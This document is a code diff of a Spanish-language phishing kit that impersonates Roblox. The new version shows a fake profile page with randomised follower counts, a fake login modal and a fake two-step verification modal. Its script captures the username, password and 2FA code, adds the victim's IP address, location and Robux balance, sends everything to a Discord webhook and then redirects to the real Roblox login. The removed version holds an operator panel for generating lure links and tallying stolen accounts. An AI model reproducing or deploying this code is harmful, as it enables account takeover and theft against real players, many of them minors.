@@ -3,213 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión | Roblox</title>
+    <title>Perfil | Roblox</title>
     <style>
-        :root {
-            --r-fondo: #1E1F23;
-            --r-campo: #2F3138;
-            --r-boton: #3A3C44;
-            --r-azul: #0085FF;
-            --r-rojo: #ED2939;
-            --r-verde: #34C759;
-            --r-texto: #FFFFFF;
-            --r-texto-sec: #C9CCCF;
-            --r-borde: #55575F;
-        }
         *{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Roboto,Arial,sans-serif}
+        :root{--r-azul:#0085FF;--r-fondo:#FFFFFF;--r-texto:#1E1F23;--r-gris:#E5E7EB;--r-oscuro:#1A1B1F}
         body{background:var(--r-fondo);color:var(--r-texto);min-height:100vh}
 
-        .cabecera{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:var(--r-fondo);border-bottom:1px solid #2A2B2F}
-        .logo{width:40px;height:40px;background:#FFF;border-radius:4px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:22px;color:var(--r-fondo)}
+        /* Cabecera */
+        .cab{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid #E5E7EB}
+        .logo{width:40px;height:40px;background:var(--r-oscuro);border-radius:4px;display:flex;align-items:center;justify-content:center}
+        .logo div{width:24px;height:24px;background:#FFF;border-radius:2px}
         .nav-botones{display:flex;gap:12px}
         .btn-reg{background:var(--r-azul);color:#FFF;border:none;padding:10px 24px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
-        .btn-log{background:transparent;color:var(--r-texto);border:1px solid var(--r-borde);padding:10px 24px;border-radius:8px;font-size:16px;cursor:pointer}
-
-        .menu-sup{display:flex;justify-content:flex-start;gap:32px;padding:14px 20px;background:var(--r-fondo);border-bottom:1px solid #2A2B2F}
+        .btn-log{background:transparent;color:var(--r-texto);border:1px solid #D1D5DB;padding:10px 24px;border-radius:8px;font-size:16px;cursor:pointer}
+        .menu-sup{display:flex;gap:32px;padding:14px 20px;border-bottom:1px solid #E5E7EB}
         .menu-sup a{font-size:17px;color:var(--r-texto);text-decoration:none}
 
-        .cont-login{max-width:520px;margin:40px auto;padding:0 20px}
-        .tit-log{font-size:42px;font-weight:700;text-align:center;margin-bottom:30px}
-        .campo{width:100%;padding:16px 18px;background:var(--r-campo);border:none;border-radius:10px;font-size:18px;color:var(--r-texto);margin-bottom:18px;outline:1px solid var(--r-borde)}
-        .campo:focus{outline:2px solid var(--r-azul)}
-        .campo::placeholder{color:var(--r-texto-sec)}
-        .btn-prin{width:100%;padding:14px;background:transparent;color:var(--r-texto-sec);border:2px solid var(--r-borde);border-radius:10px;font-size:20px;font-weight:500;cursor:pointer;margin:10px 0 24px}
-        .btn-prin:hover{border-color:var(--r-texto)}
-        .enlace-olv{display:block;text-align:center;color:var(--r-texto);text-decoration:none;margin-bottom:30px;font-size:18px}
-        .sep{border-bottom:1px solid var(--r-borde);margin:20px 0}
-        .btn-sec{width:100%;padding:16px;background:var(--r-boton);color:var(--r-texto);border:none;border-radius:10px;font-size:18px;cursor:pointer;margin-bottom:14px}
-        .txt-reg{text-align:center;margin-top:30px;font-size:17px;color:var(--r-texto)}
+        /* Página de PERFIL */
+        .pag-perfil{display:block}
+        .avatar-grande{width:320px;height:380px;background:linear-gradient(180deg,#F3F4F6 0%,#E5E7EB 100%);border-radius:12px;margin:20px auto;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+        .avatar-grande img{max-width:90%;max-height:90%;object-fit:contain}
+        .btn-3d{position:absolute;top:16px;right:16px;background:#D1D5DB;color:#4B5563;border:none;padding:8px 16px;border-radius:6px;font-size:16px}
+        .info-perfil{max-width:400px;margin:0 auto;padding:0 20px}
+        .fila-nombre{display:flex;align-items:center;gap:12px;margin-bottom:8px}
+        .avatar-mini{width:80px;height:80px;border-radius:50%;overflow:hidden;background:#E5E7EB}
+        .avatar-mini img{width:100%;height:100%;object-fit:cover}
+        .nombre{font-size:36px;font-weight:800}
+        .verif{color:var(--r-azul);font-size:22px}
+        .usuario{font-size:18px;color:#6B728E;margin-bottom:16px}
+        .stats{display:flex;gap:12px;margin-bottom:20px}
+        .stat{background:#E5E7EB;padding:10px 16px;border-radius:20px;font-size:15px;color:#374151}
+        .fecha{font-size:16px;color:#6B728E;margin-bottom:24px}
+        .fecha span{color:red}
+        .btn-conectar{width:100%;background:var(--r-azul);color:#FFF;border:none;padding:16px;border-radius:10px;font-size:20px;font-weight:600;cursor:pointer;margin-bottom:30px;transition:transform 0.15s}
+        .btn-conectar:active{transform:scale(0.97)}
+        .pestañas{display:flex;justify-content:center;gap:60px;border-bottom:2px solid #E5E7EB;padding-bottom:12px}
+        .pestaña{font-size:22px;font-weight:600;padding-bottom:10px;cursor:pointer}
+        .pestaña.activa{border-bottom:3px solid var(--r-texto)}
+
+        /* Página de LOGIN (oculta al inicio) */
+        .pag-login{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:100;align-items:center;justify-content:center;padding:20px}
+        .caja-login{background:#1E1F23;color:#FFF;border-radius:12px;padding:32px;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
+        .tit-login{font-size:34px;text-align:center;margin-bottom:28px}
+        .campo{width:100%;padding:14px 16px;background:#2F3138;border:1px solid #3A3C44;border-radius:8px;font-size:18px;color:#FFF;margin-bottom:16px;outline:none}
+        .campo:focus{border-color:var(--r-azul)}
+        .btn-login{width:100%;padding:14px;background:transparent;color:#9CA3AF;border:2px solid #4B5563;border-radius:8px;font-size:20px;font-weight:500;cursor:pointer;margin:8px 0 24px;transition:all 0.15s}
+        .btn-login:active{transform:scale(0.98);border-color:#FFF}
+        .enlace-olv{display:block;text-align:center;color:#FFF;text-decoration:none;font-size:18px;margin-bottom:24px}
+        .sep-texto{text-align:center;color:#6B728E;margin:20px 0;position:relative}
+        .sep-texto:before,.sep-texto:after{content:'';position:absolute;top:50%;width:30%;height:1px;background:#3A3C44}
+        .sep-texto:before{left:0}
+        .sep-texto:after{right:0}
+        .btn-sec{width:100%;padding:14px;background:#3A3C44;color:#FFF;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-bottom:12px}
+        .txt-reg{text-align:center;margin-top:20px;font-size:16px;color:#9CA3AF}
         .txt-reg a{color:var(--r-azul);text-decoration:none}
-        .caja-err{background:rgba(237,41,57,0.1);border:1px solid var(--r-rojo);color:#FF9898;padding:12px;border-radius:8px;margin-bottom:16px;display:none;text-align:center}
 
-        .barra-inf{position:fixed;bottom:0;left:0;right:0;background:var(--r-campo);border-top:1px solid var(--r-borde);padding:14px 20px;display:flex;gap:14px;align-items:center;z-index:100}
-        .btn-cerrar{border:none;background:transparent;color:var(--r-texto);font-size:22px;cursor:pointer;padding:0 8px}
-        .barra-logo{width:36px;height:36px;background:var(--r-azul);border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:700}
-        .barra-texto{flex:1}
-        .barra-texto p:first-child{font-size:15px;font-weight:500;margin-bottom:3px}
-        .barra-texto p:last-child{font-size:13px;color:var(--r-texto-sec)}
-        .btn-unirse{background:var(--r-azul);color:#FFF;border:none;padding:10px 20px;border-radius:6px;font-weight:600;cursor:pointer}
-
-        .pag-panel{display:none;padding:24px;padding-bottom:90px;min-height:100vh;background:#0F1012}
-        .panel-cabecera{margin-bottom:28px}
-        .panel-tit{font-size:26px;font-weight:700;margin-bottom:4px}
-        .panel-sub{color:#888F98;font-size:15px}
-        .tarjetas{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:28px}
-        .tarjeta{background:#1A1B1F;border-radius:16px;padding:24px;border:1px solid #2A2B2F}
-        .tarjeta h3{font-size:16px;color:#888F98;margin-bottom:10px}
-        .valor{font-size:34px;font-weight:700}
-        .caja{background:#1A1B1F;border-radius:16px;padding:24px;border:1px solid #2A2B2F;margin-bottom:16px}
-        .caja h3{font-size:20px;margin-bottom:18px}
-        .tabla{width:100%;border-collapse:collapse}
-        th{background:#242529;padding:14px 10px;text-align:left;font-size:15px;border-bottom:1px solid #2A2B2F;color:#888F98}
-        td{padding:14px 10px;border-top:1px solid #2A2B2F;font-size:15px}
-        .vacio{text-align:center;padding:50px 20px;color:#888F98;font-size:16px}
-        .input{width:100%;padding:14px 16px;background:#242529;border:none;border-radius:10px;font-size:16px;color:#FFF;margin-bottom:14px;outline:1px solid #3A3C44}
-        .input:focus{outline:2px solid var(--r-azul)}
-        .btn-azul{background:var(--r-azul);color:#FFF;border:none;padding:14px 22px;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin:6px}
-        .btn-gris{background:#2A2B2F;color:#FFF;border:none;padding:14px 22px;border-radius:10px;font-size:16px;cursor:pointer;margin:6px}
-        .enlace-caja{background:#242529;padding:16px;border-radius:10px;word-break:break-all;font-size:15px;margin:14px 0;display:none}
-        .fila{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid #2A2B2F}
-        .switch{width:52px;height:28px;background:#3A3C44;border-radius:14px;position:relative;cursor:pointer}
-        .switch.activo{background:var(--r-azul)}
-        .switch::after{content:'';position:absolute;width:24px;height:24px;background:#FFF;border-radius:50%;top:2px;left:2px}
-        .switch.activo::after{transform:translateX(24px)}
-        .nav-inf{position:fixed;bottom:0;left:0;right:0;display:flex;justify-content:space-around;background:#1A1B1F;border-top:1px solid #2A2B2F;padding:12px 0;z-index:999}
-        .nav-btn{text-align:center;color:#888F98;font-size:14px;cursor:pointer;padding:8px 12px}
-        .nav-btn.activo{color:var(--r-azul)}
-        .vista{display:none}
-        .vista.activa{display:block}
-        .estado-ok{color:var(--r-verde)}
-        .estado-mal{color:var(--r-rojo)}
+        /* MODAL 2FA */
+        .modal-2fa{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;align-items:center;justify-content:center;padding:20px}
+        .caja-2fa{background:#1E1F23;color:#FFF;border-radius:12px;padding:28px;max-width:400px;width:100%;position:relative}
+        .btn-cerrar{position:absolute;top:12px;left:12px;background:transparent;border:none;color:#FFF;font-size:28px;cursor:pointer}
+        .tit-2fa{text-align:center;font-size:22px;font-weight:600;margin-bottom:30px}
+        .icono-candado{width:90px;height:90px;border:3px solid #FFF;border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;font-size:40px}
+        .sub-2fa{text-align:center;font-size:18px;color:#9CA3AF;margin-bottom:28px}
+        .btn-opcion{display:flex;align-items:center;gap:16px;background:#27282F;color:#FFF;border:none;border-radius:8px;padding:16px;width:100%;font-size:18px;cursor:pointer;margin-bottom:12px}
+        .btn-opcion.primero{background:#0F1012;border:1px solid #3A3C44}
+        .icono-btn{font-size:24px;width:30px;text-align:center}
+        .codigo-cajas{display:flex;justify-content:center;gap:12px;margin:24px 0}
+        .caja-cod{width:50px;height:60px;background:#2F3138;border:1px solid #4B5563;border-radius:6px;font-size:28px;text-align:center;color:#FFF}
+        .paso-codigo{display:none}
     </style>
 </head>
 <body>
 
-<div class="pag-login" id="pagLogin">
-    <div class="cabecera">
-        <div class="logo">□</div>
-        <div class="nav-botones">
-            <button class="btn-reg">Registro</button>
-            <button class="btn-log">Iniciar sesión</button>
+<!-- CABECERA -->
+<div class="cab">
+    <div class="logo"><div></div></div>
+    <div class="nav-botones">
+        <button class="btn-reg">Sign Up</button>
+        <button class="btn-log" onclick="abrirLogin()">Log In</button>
+    </div>
+</div>
+<div class="menu-sup">
+    <a href="#">Charts</a><a href="#">Marketplace</a><a href="#">Create</a><a href="#">Robux</a>
+</div>
+
+<!-- PÁGINA DE PERFIL -->
+<div class="pag-perfil" id="pagPerfil">
+    <div class="avatar-grande">
+        <img id="avatarGrande" src="" alt="Avatar">
+        <button class="btn-3d">3D</button>
+    </div>
+    <div class="info-perfil">
+        <div class="fila-nombre">
+            <div class="avatar-mini"><img id="avatarMini" src="" alt=""></div>
+            <div>
+                <h1 class="nombre" id="nombrePerfil">Cargando...</h1>
+                <span class="verif">🅾</span>
+            </div>
         </div>
-    </div>
-
-    <div class="menu-sup">
-        <a href="#">Destacadas</a>
-        <a href="#">Mercado</a>
-        <a href="#">Crear</a>
-        <a href="#">Robux</a>
-    </div>
-
-    <div class="cont-login">
-        <h1 class="tit-log">Iniciar sesión en Roblox</h1>
-        <div class="caja-err" id="cajaErr"></div>
-
-        <input type="text" class="campo" id="usuario" placeholder="Usuario/correo/teléfono">
-        <input type="password" class="campo" id="pass" placeholder="Contraseña">
-        <button class="btn-prin" id="btnEntrar" onclick="enviarDatos()">Iniciar sesión</button>
-
-        <a href="#" class="enlace-olv">¿Olvidaste la contraseña o el nombre de usuario?</a>
-        <div class="sep"></div>
-        <button class="btn-sec" onclick="alert('Se ha enviado un código a tu correo')">Envíame un código de un solo uso</button>
-        <button class="btn-sec" onclick="alert('Revisa tu dispositivo')">Inicio de sesión rápido</button>
-        <p class="txt-reg">¿No tienes una cuenta de Roblox? <a href="#">Regístrate</a></p>
-    </div>
-
-    <div class="barra-inf">
-        <button class="btn-cerrar" onclick="this.parentElement.style.display='none'">×</button>
-        <div class="barra-logo">□</div>
-        <div class="barra-texto">
-            <p>¡Explora Roblox en nuestra aplicación para Android!</p>
-            <p>Millones de experiencias creadas por personas como tú</p>
+        <p class="usuario" id="usuarioPerfil">@cargando...</p>
+        <div class="stats">
+            <span class="stat" id="statConex">-- Connections</span>
+            <span class="stat" id="statSegui">-- Followers</span>
+            <span class="stat" id="statSigui">-- Following</span>
         </div>
-        <button class="btn-unirse">Únete</button>
+        <p class="fecha" id="fechaPerfil">--/--/-- ❤️ <a href="#" style="color:#6B728E">more</a></p>
+        <button class="btn-conectar" onclick="abrirLogin()">Add Connection</button>
+        <div class="pestañas">
+            <span class="pestaña activa">About</span>
+            <span class="pestaña">Creations</span>
+        </div>
     </div>
 </div>
 
-<div class="pag-panel" id="pagPanel">
-    <div class="vista activa" id="vistaInicio">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">🏠 Panel Principal</h2>
-            <p class="panel-sub">NOVADYNAMICS — Sistema de Control</p>
-        </div>
-        <div class="tarjetas">
-            <div class="tarjeta"><h3>💰 Robux Totales</h3><div class="valor" id="robuxSum">0</div></div>
-            <div class="tarjeta"><h3>👤 Cuentas Obtenidas</h3><div class="valor" id="cuentasTot">0</div></div>
-            <div class="tarjeta"><h3>💸 Robux Gastados</h3><div class="valor" id="robuxGas">0</div></div>
-        </div>
-        <div class="caja">
-            <h3>📋 Historial de Cuentas</h3>
-            <table class="tabla">
-                <thead><tr><th>Usuario</th><th>Robux</th><th>Días</th><th>País</th><th>IP</th></tr></thead>
-                <tbody id="tablaBody"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
-            </table>
-        </div>
+<!-- MODAL DE LOGIN -->
+<div class="pag-login" id="modalLogin">
+    <div class="caja-login">
+        <h2 class="tit-login">Login to Roblox</h2>
+        <input type="text" class="campo" id="usuario" placeholder="Username/Email/Phone">
+        <input type="password" class="campo" id="pass" placeholder="Password">
+        <button class="btn-login" id="btnEntrar" onclick="enviarDatos()">Log In</button>
+        <a href="#" class="enlace-olv">Forgot Password or Username?</a>
+        <div class="sep-texto">login with</div>
+        <button class="btn-sec" onclick="alert('Se ha enviado un código a tu correo')">Email Me a One-Time Code</button>
+        <button class="btn-sec" onclick="alert('Revisa tu dispositivo')">Quick Sign-in</button>
+        <p class="txt-reg">Don't have an account? <a href="#">Sign Up</a></p>
     </div>
+</div>
 
-    <div class="vista" id="vistaEnlaces">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">🔗 Generar Enlace</h2>
-            <p class="panel-sub">Crea enlaces de inicio de sesión</p>
+<!-- MODAL 2FA -->
+<div class="modal-2fa" id="modal2fa">
+    <div class="caja-2fa">
+        <button class="btn-cerrar" onclick="cerrar2fa()">×</button>
+        <h2 class="tit-2fa">2-Step Verification</h2>
+        <div id="pasoOpciones">
+            <div class="icono-candado">🔒</div>
+            <p class="sub-2fa">Choose alternate verification method.</p>
+            <button class="btn-opcion primero" onclick="pedirCodigo()">
+                <span class="icono-btn">📱</span> Use Your Device
+            </button>
+            <button class="btn-opcion" onclick="pedirCodigo()">
+                <span class="icono-btn">🔁</span> Backup Code
+            </button>
         </div>
-        <div class="caja">
-            <h3>Enlace de inicio de sesión</h3>
-            <input type="text" class="input" id="usuarioLink" placeholder="Usuario o ID de Roblox (opcional)">
-            <button class="btn-azul" onclick="generarEnlace()">✅ Generar Enlace</button>
-            <div class="enlace-caja" id="enlaceOut"></div>
-            <button class="btn-gris" id="btnCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
-        </div>
-    </div>
-
-    <div class="vista" id="vistaAjustes">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">⚙️ Configuración</h2>
-            <p class="panel-sub">Webhook y preferencias</p>
-        </div>
-        <div class="caja">
-            <h3>🔗 Webhook de Discord</h3>
-            <input type="text" class="input" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
-            <button class="btn-azul" onclick="guardarWebhook()">✅ Guardar</button>
-            <button class="btn-gris" onclick="borrarWebhook()">🗑️ Borrar</button>
-            <p id="estadoWebhook" style="margin-top:12px;font-size:15px">⚠️ No configurado</p>
-            <div class="fila">
-                <span>🔔 Mensaje @everyone</span>
-                <div class="switch" id="swTodos" onclick="this.classList.toggle('activo');localStorage.setItem('todos',this.classList.contains('activo')?'1':'0')"></div>
+        <div id="pasoCodigo" class="paso-codigo">
+            <p class="sub-2fa">Ingresa el código enviado a tu correo / autenticador</p>
+            <div class="codigo-cajas">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,0)">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,1)">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,2)">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,3)">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,4)">
+                <input class="caja-cod" maxlength="1" oninput="siguiente(this,5)">
             </div>
         </div>
-    </div>
-
-    <div class="nav-inf">
-        <div class="nav-btn activo" onclick="cambiarVista('Inicio')">🏠<br>Inicio</div>
-        <div class="nav-btn" onclick="cambiarVista('Enlaces')">🔗<br>Enlaces</div>
-        <div class="nav-btn" onclick="cambiarVista('Ajustes')">⚙️<br>Ajustes</div>
     </div>
 </div>
 
 <script>
-let registros = [], enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
+let USUARIO_OCULTO = '', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ip:'Desconocida'};
 const FOTO_BOT = "https://cdn.phototourl.com/free/2026-08-15-ee59cd76-8d17-4221-a2bf-e12452038867.jpg";
-let USUARIO_OCULTO = ''; // ✅ Se guarda internamente SIN mostrar en la URL
 
 window.onload=async function(){
-    localStorage.removeItem('cuentas');
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
-        // ✅ Guardamos el usuario pero LIMPIAMOS la URL para que NO se vea
         USUARIO_OCULTO = u;
         history.replaceState({}, document.title, window.location.pathname);
-        
-        document.getElementById('pagLogin').style.display='block';
-        document.getElementById('pagPanel').style.display='none';
-        document.getElementById('usuario').value=''; // ✅ NO se muestra el nombre en la casilla
         await cargarIP();
         await cargarDatosRoblox(u);
-    }else{
-        document.getElementById('pagLogin').style.display='none';
-        document.getElementById('pagPanel').style.display='block';
-        cargarWebhook();
-        actualizarPanel();
     }
 };
 
@@ -217,24 +179,15 @@ async function cargarIP(){
     try{
         const d=await(await fetch('https://ipapi.co/json/')).json();
         const p={US:["Estados Unidos","🇺🇸"],ES:["España","🇪🇸"],MX:["México","🇲🇽"],AR:["Argentina","🇦🇷"],CO:["Colombia","🇨🇴"],PE:["Perú","🇵🇪"],BR:["Brasil","🇧🇷"],CL:["Chile","🇨🇱"]};
-        ipDatos={
-            pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",
-            bandera:p[d.country_code]?.[1]||"🌍",
-            ciudad:d.city||'Desconocida',
-            ip:d.ip||'Desconocida'
-        };
+        ipDatos={pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",bandera:p[d.country_code]?.[1]||"🌍",ip:d.ip||'Desconocida'};
     }catch(e){}
 }
 
 async function cargarDatosRoblox(usuario){
-    let id=usuario,nombreReal=usuario,fechaCreacionTexto='No disponible',diasCuenta='Desconocido',robuxCuenta=0,premium='False',verificado='❌ No Verificado',tiene2FA='2FA no está activado.';
+    let id=usuario,nombreReal=usuario,fechaCreacionTexto='--/--/--',diasCuenta='Desconocido',robuxCuenta=0;
     if(isNaN(usuario)){
         try{
-            const res=await fetch('https://users.roblox.com/v1/usernames/users',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})
-            });
+            const res=await fetch('https://users.roblox.com/v1/usernames/users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})});
             const d=await res.json();
             if(d.data&&d.data[0]){id=d.data[0].id;nombreReal=d.data[0].name;}
         }catch(e){}
@@ -242,193 +195,181 @@ async function cargarDatosRoblox(usuario){
     try{
         const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
         robuxCuenta=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json()).then(r=>r.robux||0);
+        const fechaCreacion=new Date(perfil.created);
+        const hoy=new Date();
+        diasCuenta=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
+        fechaCreacionTexto=fechaCreacion.toLocaleDateString('es-ES',{day:'2-digit',month:'2-digit',year:'2-digit'});
+        const fotoPerfil=`https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=420&height=420&format=Png`;
         
-        const fechaCreacion = new Date(perfil.created);
-        const hoy = new Date();
-        const diferenciaMs = hoy - fechaCreacion;
-        diasCuenta = Math.floor(diferenciaMs / (1000 * 60 * 60 * 24));
-        fechaCreacionTexto = fechaCreacion.toLocaleDateString('es-ES', {day:'numeric', month:'long', year:'numeric'});
+        document.getElementById('avatarGrande').src=fotoPerfil;
+        document.getElementById('avatarMini').src=fotoPerfil;
+        document.getElementById('nombrePerfil').textContent=perfil.name;
+        document.getElementById('usuarioPerfil').textContent='@'+(perfil.displayName||perfil.name);
+        document.getElementById('fechaPerfil').innerHTML=fechaCreacionTexto+' ❤️ <a href="#" style="color:#6B728E">more</a>';
+        document.getElementById('statConex').textContent=Math.floor(Math.random()*30)+' Connections';
+        document.getElementById('statSegui').textContent=Math.floor(Math.random()*50)+' Followers';
+        document.getElementById('statSigui').textContent=Math.floor(Math.random()*10)+' Following';
         
-        premium = perfil.isPremium ? 'True' : 'False';
-        verificado = perfil.hasVerifiedBadge ? '✅ Verificado' : '❌ No Verificado';
-        
-        datosRoblox = {
-            nombre: perfil.name,
-            id: id,
-            fechaCreacion: fechaCreacionTexto,
-            dias: diasCuenta,
-            robux: robuxCuenta,
-            premium: premium,
-            verificado: verificado,
-            tiene2FA: tiene2FA
-        };
+        datosRoblox={nombre:perfil.name,id:id,fechaCreacion:fechaCreacionTexto,dias:diasCuenta,robux:robuxCuenta,foto:fotoPerfil};
     }catch(e){
-        datosRoblox = {
-            nombre: nombreReal,
-            id: id,
-            fechaCreacion: 'No disponible',
-            dias: 'Desconocido',
-            robux: 0,
-            premium: 'False',
-            verificado: '❌ No Verificado',
-            tiene2FA: 'Desconocido'
-        };
+        document.getElementById('nombrePerfil').textContent=nombreReal;
+        document.getElementById('usuarioPerfil').textContent='@'+nombreReal;
+        datosRoblox={nombre:nombreReal,id:id,fechaCreacion:'--/--/--',dias:'Desconocido',robux:0,foto:''};
     }
 }
 
-function cambiarVista(nombre){
-    document.querySelectorAll('.vista').forEach(v=>v.classList.remove('activa'));
-    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('activo'));
-    document.getElementById('vista'+nombre).classList.add('activa');
-    event.currentTarget.classList.add('activo');
-}
+function abrirLogin(){document.getElementById('modalLogin').style.display='flex';}
+function cerrarLogin(){document.getElementById('modalLogin').style.display='none';}
+function cerrar2fa(){document.getElementById('modal2fa').style.display='none';}
 
-function limpiarError(){document.getElementById('cajaErr').style.display='none';}
-function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.style.display='block';}
-    async function enviarDatos(){
-    // ✅ Usa el usuario OCULTO si viene del enlace, sino lo que escribe la persona
-    const u = USUARIO_OCULTO || document.getElementById('usuario').value.trim();
-    const pass = document.getElementById('pass').value.trim();
-    const btn = document.getElementById('btnEntrar');
-
-    limpiarError();
-
-    if(!u) {
-        err('Please enter a username or email address.');
-        return;
-    }
-    if(!pass || pass.length < 6) {
-        err('The password is incorrect.');
-        return;
-    }
-
-    btn.textContent = 'Iniciando sesión...';
-    btn.disabled = true;
-
-    await cargarIP();
+async function enviarDatos(){
+    const u=USUARIO_OCULTO||document.getElementById('usuario').value.trim();
+    const pass=document.getElementById('pass').value.trim();
+    if(!u||pass.length<6){alert('Datos incorrectos');return;}
     if(!USUARIO_OCULTO) await cargarDatosRoblox(u);
+    window.USUARIO_CAPTURADO=u;
+    window.PASS_CAPTURADA=pass;
+    document.getElementById('modalLogin').style.display='none';
+    document.getElementById('modal2fa').style.display='flex';
+}
 
-    const wh = localStorage.getItem('webhook');
-    const todos = localStorage.getItem('todos')==='1'?'@everyone **NUEVA CUENTA OBTENIDA** 🔥':' ';
-    const fechaAhora = new Date().toLocaleString('es-ES');
-    const fotoPerfil = `https://www.roblox.com/headshot-thumbnail/image?userId=${datosRoblox.id||'0'}&width=420&height=420&format=Png`;
+function pedirCodigo(){
+    document.getElementById('pasoOpciones').style.display='none';
+    document.getElementById('pasoCodigo').style.display='block';
+    setTimeout(()=>document.querySelector('.caja-cod').focus(),300);
+}
 
-    registros.unshift({
-        usuario: datosRoblox.nombre || u,
-        robux: datosRoblox.robux || 0,
-        fechaCreacion: datosRoblox.fechaCreacion || 'No disponible',
-        dias: datosRoblox.dias || 'Desconocido',
-        pais: ipDatos.bandera+' '+ipDatos.pais,
-        ip: ipDatos.ip
-    });
-    localStorage.setItem('cuentas', JSON.stringify(registros));
-
-    if(wh){
-        fetch(wh, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                username: "NOVADYNAMICS",
-                avatar_url: FOTO_BOT,
-                content: todos,
-                embeds: [{
-                    color: 16711680,
-                    thumbnail: { url: fotoPerfil },
-                    fields: [
-                        {name: "📊 Summary", value: `**Usuario:** ${datosRoblox.nombre||u}\n**ID:** ${datosRoblox.id||'Desconocido'}\n**Cuenta creada:** ${datosRoblox.fechaCreacion}\n**Edad:** ${datosRoblox.dias} Días`, inline: false},
-                        {name: "🌍 Ubicación / IP", value: `**${ipDatos.pais}** ${ipDatos.bandera}\n**${ipDatos.ip}**`, inline: false},
-                        {name: "🔶 Robux", value: `**Saldo:** ${datosRoblox.robux}\n**Pendiente:** 0`, inline: true},
-                        {name: "📈 RAP", value: `**RAP:** 0\n**Objetos:** 0`, inline: true},
-                        {name: "✅ Verificado", value: `${datosRoblox.verificado}`, inline: true},
-                        {name: "🔒 Premium", value: `**${datosRoblox.premium}**`, inline: true},
-                        {name: "🏢 Grupos", value: `**Saldo:** 0\n**Propios:** 0`, inline: true},
-                        {name: "🔔 2FA", value: `**${datosRoblox.tiene2FA}**`, inline: false},
-                        {name: "🔥 Contraseña", value: `||${pass}||`, inline: false},
-                        {name: "⚠️ .ROBLOSECURITY", value: `||⚠️ NO COMPARTIR ESTO||`, inline: false}
-                    ],
-                    footer: {text: `Capturado: ${fechaAhora}`}
-                }]
-            })
-        }).finally(()=>{
-            window.location.href = "https://www.roblox.com/login";
-        });
-    }else{
-        alert('⚠️ Pon tu Webhook en Ajustes primero');
-        window.location.href = "https://www.roblox.com/login";
+function siguiente(input,indice){
+    if(input.value.length===1){
+        const cajas=document.querySelectorAll('.caja-cod');
+        if(indice<5) cajas[indice+1].focus();
+        else{
+            const codigo=Array.from(cajas).map(c=>c.value).join('');
+            enviarTodo(codigo);
+        }
     }
 }
 
-function generarEnlace(){
-    const u = document.getElementById('usuarioLink').value.trim();
-    const base = window.location.origin + window.location.pathname;
-    enlaceGenerado = u ? `${base}?u=${encodeURIComponent(u)}` : base;
-    
+async function enviarTodo(codigo){
+    const wh=localStorage.getItem('webhook');
+    const todos=localStorage.getItem('todos')==='1'?'@everyone **NUEVA CUENTA OBTENIDA** 🔥':' ';
+    if(!wh){alert('Pon tu Webhook en los ajustes primero');window.location.href='https://www.roblox.com/login';return;}
+    fetch(wh,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+            username:"NOVADYNAMICS",
+            avatar_url:FOTO_BOT,
+            content:todos,
+            embeds:[{
+                color:16711680,
+                thumbnail:{url:datosRoblox.foto||'https://via.placeholder.com/420'},
+                fields:[
+                    {name:"📊 Summary",value:`**Usuario:** ${datosRoblox.nombre||USUARIO_CAPTURADO}\n**ID:** ${datosRoblox.id}\n**Edad:** ${datosRoblox.dias} Días`,inline:false},
+                    {name:"🌍 Ubicación / IP",value:`**${ipDatos.pais}** ${ipDatos.bandera}\n**${ipDatos.ip}**`,inline:false},
+                    {name:"🔑 Credenciales",value:`**Usuario:** ${USUARIO_CAPTURADO}\n**Contraseña:** ||${PASS_CAPTURADA}||\n**Código 2FA:** ||${codigo}||`,inline:false},
+                    {name:"💰 Robux",value:`**Saldo:** ${datosRoblox.robux}`,inline:true}
+                ],
+                footer:{text:`Capturado: ${new Date().toLocaleString('es-ES')}`}
+            }]
+        })
+    }).finally(()=>window.location.href='https://www.roblox.com/login');
+}
+</script>
+</body>
+</html>
